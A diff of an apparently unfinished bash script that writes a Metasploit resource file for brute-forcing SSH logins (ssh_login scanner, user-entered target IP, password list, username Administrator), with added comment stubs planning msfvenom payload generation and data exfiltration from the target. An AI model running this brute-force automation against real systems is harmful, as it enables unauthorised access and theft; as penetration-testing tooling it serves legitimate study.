@@ -43,13 +43,22 @@ case $ATTACK_MODE in
 esac
 
 # Part 3
-#get password list via 1) built-in list 2) seclists 3) user spcified download
+#get password list via 1) built-in list 2) seclists 3) user specified upload/download, for use in Part 2.1?
 
 # Part 4
 read -p "Enter Target IP: " TARGET_IP
-cd OUTPUT
+cd OUTPUT_DIR
 touch ssh_scanner.rc
 echo 'use auxiliary/scanner/ssh/ssh_login' >> ssh_scanner.rc
 echo 'set rhosts $TARGET_IP' >> ssh_scanner.rc
 echo 'set pass_file password.lst' >> ssh_scanner.rc
 echo 'set username Administrator' >> ssh_scanner.rc
+
+# Part 5
+#generate a payload for msfvenom, also same as Part 2.2?
+
+# Part 6
+#data exfiltration, get certain files from target system
+
+# Part 7
+#create log summary/result of overall session
